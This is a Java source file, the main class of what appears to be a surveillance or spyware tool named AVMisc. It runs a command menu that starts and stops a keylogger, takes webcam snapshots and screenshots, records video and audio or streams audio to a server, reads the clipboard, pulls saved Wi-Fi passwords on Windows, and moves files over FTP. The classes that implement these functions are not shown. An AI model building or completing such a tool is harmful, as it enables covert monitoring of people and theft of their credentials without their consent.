package com.AVMisc;

import java.util.LinkedHashMap;
import java.util.Scanner;

public class AVMisc {
	private LinkedHashMap<String, String> helpItems;
	private Scanner sc;
	private Keylogger keylogger;
	private MiscUtils miscUtils;
	private AudioUtils audioUtils;
	private VideoUtils videoUtils;
	private FTPUtils ftpUtils;

	public static void main(String[] args) {
		AVMisc av = new AVMisc();
		av.begin();
	}
	
	public AVMisc() {
		sc = new Scanner(System.in);
		keylogger = new Keylogger();
		miscUtils = new MiscUtils();
		audioUtils = new AudioUtils(sc);
		videoUtils = new VideoUtils(sc);
		ftpUtils = new FTPUtils(sc);
		
		helpItems = new LinkedHashMap<>();
		helpItems.put("list_devices", "List the audio and video devices on the system");
		helpItems.put("list_browsers", "List the browsers installed on the computer");
		helpItems.put("start_audio_record", "Start recording audio on the system");
		helpItems.put("stop_audio_record", "Stop recording audio");
		helpItems.put("start_audio_playback", "Play an audio file on the system");
		helpItems.put("stop_audio_playback", "Stop playing audio");
		helpItems.put("start_streaming_audio", "Connects to a server and starts streaming audio");
		helpItems.put("stop_streaming_audio", "Stop streaming audio");
		helpItems.put("start_video_record", "Start recording video");
		helpItems.put("stop_video_record", "Stop recording video");
		helpItems.put("screenshot", "Take a screenshot");
		helpItems.put("snapshot", "Take a snapshot with the webcam");
		helpItems.put("start_kl", "Start the keylogger");
		helpItems.put("stop_kl", "Stop the keylogger");
		helpItems.put("wifi", "Get the passwords for the wireless profiles on the system(Windows only)");
		helpItems.put("clipboard", "View the contents of the clipboard");
		helpItems.put("start_cursor_jump", "Make cursor move randomly");
		helpItems.put("stop_cursor_jump", "Stop moving the cursor");
		helpItems.put("upload", "Upload a file to the server");
		helpItems.put("download", "Download a file from the server");
		helpItems.put("help", "Show this help message");
	}
	
	
	private void begin() {
		String command;
		while (true) {
			System.out.print("av_misc>");
			command = sc.nextLine();
			switch (command.toLowerCase()) {
				case "list_devices":
					audioUtils.listAudioDevices();
					videoUtils.listVideoDevices();
					break;
				case "list_browsers":
					miscUtils.listBrowsers();
					break;
				case "start_audio_record":
					audioUtils.recordAudio(false);
					break;
				case "stop_audio_record":
					audioUtils.stopRecordingAudio();
					break;
				case "start_audio_playback":
					audioUtils.playAudio();
					break;
				case "stop_audio_playback":
					audioUtils.stopPlayingAudio();
					break;
				case "start_streaming_audio":
					audioUtils.recordAudio(true);
					break;
				case "stop_streaming_audio":
					audioUtils.stopRecordingAudio();
					break;
				case "start_video_record":
					videoUtils.recordVideo();
					break;
				case "stop_video_record":
					videoUtils.stopRecordingVideo();
					break;
				case "screenshot":
					miscUtils.takeScreenshot();
					break;
				case "snapshot":
					videoUtils.takeSnapshot();
					break;
				case "start_kl":
					keylogger.start();
					break;
				case "stop_kl":
					keylogger.stop();
					break;
				case "wifi":
					miscUtils.getWifiInfo();
					break;
				case "clipboard":
					miscUtils.showClipboardContents();
					break;
				case "start_cursor_jump":
					miscUtils.startCursorJump();
					break;
				case "stop_cursor_jump":
					miscUtils.stopCursorJump();
					break;
				case "upload":
					ftpUtils.upload();
					break;
				case "download":
					ftpUtils.download();
					break;
				case "help":
					showHelp();
					break;
				case "quit":
				case "exit":
					if(keylogger.isRunning()) keylogger.stop();
					System.exit(0);
				default:
					System.out.printf("'%s' is not a recognized command. Type 'help' for a list of available commands.\n", command);
			}
		}
	}
	
	
	/***
	 * Show Help
	 */
	private void showHelp() {
		System.out.println("------------------------\n     AVMISC OPTIONS\n------------------------\n");
		helpItems.forEach((key, value) -> {
			System.out.printf("\t'%s': %s\n\n", key, value);
		});
	}

}
